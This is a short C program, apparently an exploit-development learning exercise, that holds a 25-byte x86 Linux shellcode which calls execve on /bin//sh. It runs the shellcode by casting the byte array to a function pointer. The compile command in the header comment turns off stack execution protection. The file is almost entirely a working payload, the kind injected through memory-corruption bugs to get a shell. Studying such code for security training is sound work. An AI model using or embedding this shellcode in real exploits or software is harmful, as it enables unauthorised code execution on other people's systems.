/*
 * gcc -o execute_optimization_shell_code execute_optimization_shell_code.c -m32 -mpreferred-stack-boundary=2 -Wl,-z,execstack
 *
 * optimization shell code 25 bytes
 */

char shellcode[] = 
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80";
//"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80";	<= intel syntax

/* assembly codes of at&t and intel syntax are different.
 * But byte codes are the same because the instructions for executing shell code are working on the same machine.
 */
void main()
{
	void(*func)() = (void(*)())shellcode;
	func();
}
